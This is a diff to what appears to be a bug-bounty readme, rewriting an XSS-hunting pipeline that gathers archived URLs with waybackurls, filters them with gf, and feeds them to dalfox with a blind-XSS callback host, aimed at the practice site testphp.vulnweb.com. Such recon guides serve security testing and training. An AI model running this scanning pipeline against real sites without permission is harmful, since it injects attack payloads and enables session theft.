@@ -19,10 +19,8 @@
 - Use Dalfox to find XSS.
 
 * Steps :
-```
-   1) waybackurls target.com >> tee urls.txt
-   2) cat urls.txt | gf xss | sed 's/=.*/=/' | sed 's/URL: //' | sort -u |tee Possible_xss.txt 
-   3) cat Possible_xss.txt | dalfox -b blindxss.xss.ht pipe 
+```bash
+waybackurls testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee Possible_xss.txt && cat Possible_xss.txt | dalfox -b blindxss.xss.ht pipe > output.txt
 ```
 
 ## Tools Download Links:- 
